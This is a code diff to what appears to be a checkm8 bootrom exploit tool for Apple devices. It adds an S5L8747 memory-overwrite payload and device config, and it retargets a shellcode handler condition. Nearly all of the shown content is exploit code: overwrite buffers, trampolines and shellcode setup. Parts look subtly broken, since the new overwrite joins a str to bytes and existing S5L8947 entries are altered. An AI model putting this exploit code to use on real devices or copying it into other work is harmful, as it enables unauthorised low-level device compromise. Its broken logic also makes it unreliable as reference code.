@@ -291,7 +291,7 @@ def payload(cpid: int) -> bytes:
     checkm8_config = Checkm8(**this_platform.exploit_configs["checkm8"])
     checkm8_constants = checkm8_config.constants
 
-    if cpid == 0x8947:
+    if cpid == 0x8747:
         s5l8747x_handler = (
             asm_thumb_trampoline(0x2201C800 + 1, 0x70F4 + 1)
             + prepare_shellcode("usb_0xA1_2_armv7", this_platform.usb.constants)[8:]
@@ -697,6 +697,7 @@ def all_exploit_configs() -> list[DeviceConfig]:
     t8012_nop_gadget = 0x100008DB8
     t8015_nop_gadget = 0x10000A9C4
 
+    s5l8747x_overwrite = '\0' * 0x760 + struct.pack('<20xI', 0x22000300)
     s5l8947x_overwrite = b"\0" * 0x660 + struct.pack("<20xI4x", 0x34000000)
     s5l895xx_overwrite = b"\0" * 0x640 + struct.pack("<20xI4x", 0x10000000)
     t800x_overwrite = b"\0" * 0x5C0 + struct.pack("<20xI4x", 0x48818000)
@@ -735,7 +736,7 @@ def all_exploit_configs() -> list[DeviceConfig]:
     )
 
     return [
-        DeviceConfig("iBoot-1413.8", 0x8947, 41, s5l8947x_overwrite, 0, None, None),
+        DeviceConfig("iBoot-1413.8", 0x8747, 41, s5l8747x_overwrite, 0, None, None),
         # S5L8747 (DFU loop)     needs testing for time
         DeviceConfig("iBoot-1458.2", 0x8947, 626, s5l8947x_overwrite, 0, None, None),
         # S5L8947 (DFU loop)     1.97 seconds
